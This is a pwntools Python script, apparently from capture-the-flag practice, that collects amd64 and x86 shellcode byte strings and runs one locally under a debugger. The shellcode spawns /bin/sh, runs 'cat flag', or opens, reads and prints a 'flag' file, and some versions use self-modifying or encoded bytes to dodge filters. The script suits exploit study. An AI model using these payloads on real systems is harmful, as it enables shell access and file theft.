from pwn import *

context.clear(arch='amd64',os='linux')

#fd, buf, nbytes
#shellcode = asm(shellcraft.read(0,0x40407e,0xffff))
#shellcode = asm(shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"]))
#shellcode=b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\x6A\x3B\x58\x99\x0F\x05"
#shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#shellcode=b"\xB8\x02\x00\x00\x00\x31\xF6\x68\x66\x6C\x61\x67\x48\x89\xE7\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05"

#shellcode=b"\x31\xC0\xFF\xC0\xFF\xC0\x31\xF6\x48\xBB\x77\x72\x69\x74\x65\x2E\x63\x00\x53\x48\xBB\x6F\x6E\x6C\x79\x72\x65\x61\x64\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\xBA\x20\x00\x00\x00\x0F\x05\x31\xC0\xFF\xC0\x31\xFF\xFF\xC7\x48\x89\xE6\x0F\x05"
#shellcode = b"\x48\xC7\xC2\x00\x01\x00\x00\xBE\x33\x41\x40\x00\x31\xFF\x31\xC0\x31\xC9\x48\xB9\x90\x90\x90\x90\x90\x90\x90\x90\xB1\x0F\xB5\x05\x66\x89\x0D\x02\x00\x00\x00\x90\x90\x90"
#shellcode = b"\x48\xC7\xC2\x00\x01\x00\x00\xBE\x33\x41\x40\x00\x31\xFF\x31\xC0\x31\xC9\x48\xB9\x90\x90\x90\x90\x90\x90\x90\x90\xB1\x0E\xB5\x04\xFE\xC1\xFE\xC5\x66\x89\x0D\x02\x00\x00\x00\x90\x90"
shellcode = b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\x6A\x3B\x58\x99\xB1\x0E\xB5\x04\xFE\xC1\xFE\xC5\x66\x89\x0D\x02\x00\x00\x00\x90\x90\x90\x90"
shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7jcH\xb8_memory.PH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8\x01mnru^hoH1\x04$H\xb8/bin/catP1\xf6Vj\x11^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"
shellcode = b'\xd9\xd0\xd9t$\xf4^\xfcj\x0bY\x83\xc6\x19\x89\xf7\xad\x93\xad1\xd8\xabIu\xf7\x00\x02\x02\x00jjj/\x00\x00\x01\x02//rj\x00\x01\x02\x01/cko\x00\x00\x02\x00\x89\xe3j\x01\x00\x00\x00\x00\x01\x01\x01\x81\x00\x00\x00\x024$rk\x00\x00\x00\x00\x01\x011\xc9\x00\x00\x00\x00Qj\x04Y\x00\x00\x00\x00\x01\xe1Q\x89\x00\x00\x00\x00\xe11\xd2j\x00\x00\x00\x00\x0bX\xcd\x80'
r= gdb.debug_shellcode(shellcode)


r.interactive()

